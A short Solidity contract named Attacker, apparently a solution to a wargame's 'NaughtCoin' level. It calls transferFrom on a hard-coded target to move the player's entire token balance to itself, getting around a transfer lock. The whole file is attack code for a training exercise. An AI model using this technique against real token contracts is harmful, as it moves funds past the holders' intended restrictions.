// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface INaughtCoin {
    function transferFrom(address from, address to, uint256 amount) external returns (bool); 
    function balanceOf(address player) external view returns (uint256);
    function player() external view returns (address);
}

contract Attacker {
    address public constant TARGET_ADDRESS = 0x252348C239c3435DFab1365C20DDF989dd8A8431;
    INaughtCoin target;
    address player;

    constructor() {
        target = INaughtCoin(TARGET_ADDRESS);
        player = target.player();
    }

    function transferMe() public {
        bool success = target.transferFrom(player, address(this), target.balanceOf(player));
        if(!success) {
            revert("Transfer failed!!");
        }
    }
}